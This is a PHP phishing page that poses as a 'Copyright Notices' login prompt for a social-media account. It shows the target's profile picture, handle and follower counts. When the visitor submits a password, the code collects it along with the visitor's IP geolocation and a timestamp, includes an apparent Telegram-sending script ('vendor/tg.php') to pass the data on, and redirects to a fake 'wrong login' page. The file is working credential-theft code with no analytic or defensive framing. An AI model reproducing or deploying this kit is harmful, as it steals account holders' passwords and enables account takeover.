<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);
 
include('home/blind.php'); 

if ($_POST) {
    $blind = $_SESSION["blndsc"];
    $blindP =  $_POST['blnps'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $sehir = $details->city;
    date_default_timezone_set('Europe/Istanbul');
    $tarih = date("d-m-Y H:i:s");
	
    header("location: wrong-login.php");
      include 'vendor/tg.php';
     include 'assets/date/date/date.php';
  }
  ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    <link rel="stylesheet" href="./assets/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
    <title>Copyright Notices</title>
</head>
<body>
    <section class="side">
        <img src="./assets/images/img.svg" alt="">
    </section>

    <section class="main">
        <div class="login-container">
            <p class="title"><img src="<?php echo $pp; ?>" style="width: 150px; border-radius: 50%; margin-top:40px; border:2px solid #cecece" alt="">
</p>
            <br>
        <br>
        <h2>
       <center> @<?php echo  $name; ?></center>
</h2>
<h2>
        <div class="box">
         <table>
             <thead>
                 <tr>
                     <td><h6><?php echo $gonderi; ?></h6></td>
                     <td><h6><?php echo $takipci; ?></h6></td>
                     <td><h6><?php echo $takip; ?></h6></td>
                 </tr>
             </thead>
             <tbody>
                 <tr>
                 
                 </tr>
             </tbody>
         </table>
     </div>
</h2>

            <div class="separator" style="margin-top:50px;"></div>
            <p class="welcome-message">You are on the right step. <br>Information will be provided in the next step.</p>

            <form class="login-form" method="post">
                
                <div class="form-control" method="post">
                    <input type="password" placeholder="Password" minlength="6" required name="blnps">
                    <i class="fas fa-lock"></i>
                </div>
                <button class="submit">Login</button>
            </form>
        </div>
    </section>
    
</body>
</html>